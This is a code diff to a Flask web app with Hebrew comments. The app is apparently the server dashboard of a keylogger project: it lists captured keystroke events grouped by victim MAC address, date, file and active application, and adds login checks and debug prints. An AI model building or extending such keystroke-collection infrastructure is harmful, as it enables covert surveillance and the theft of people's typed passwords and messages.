@@ -34,7 +34,6 @@ def load_user(user_id):
 # עמוד התחברות
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
@@ -65,16 +64,39 @@ def get_folders():
     return render_template('list_of_folders.html', folders=folders)
 
 
+from flask import render_template
+
 @app.route('/folders/<folder_name>', methods=['GET'])
 @login_required
 def show_folder_contents(folder_name):
+    # מחפש את הנתונים עבור תיקיית ה-MAC
     base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
-
-    # טוען את התוכן של התיקיה כ-JSON
     files = load_data(mac_address=str(folder_name))
-    # החזרת הנתונים כ-JSON
-    return jsonify({'folder_name': folder_name, 'files': files})
 
+    # לא מחזיר JSON גולמי, אלא מעבד את הנתונים בצורה מתאימה
+    file_info = []  # יצירת רשימה שתכיל את המידע עבור התצוגה
+    print(files)
+    print("aaaaaaaaaaaaaaaa")
+    for mac, data in files.items():
+        for date, files_in_date in data.items():
+
+            for filename, key_events in files_in_date.items():
+                for time_write , current_app_event in key_events.items():
+                    for current_app , events in current_app_event.items():
+
+
+                        file_info.append({
+                            'mac': mac,
+                            'date': date,
+                            'filename': filename,
+                            'app': current_app,
+                            'time write' : time_write,
+                            'events': events
+                        })
+                        # print(key_events)
+
+    # מחזיר את המידע לתבנית ה-HTML
+    return render_template('folder_contents.html', folder_name=folder_name, files=file_info)
 
 # עמוד התנתקות
 @app.route('/logout')
@@ -209,6 +231,7 @@ def upload_data():
 
 
 @app.route('/<computers>',methods=['GET'])
+@login_required
 def get_data(computers,mac_address=None,date=None):
         if not computers:
             return flask.jsonify({'error': 'must get -computers-'}), 400
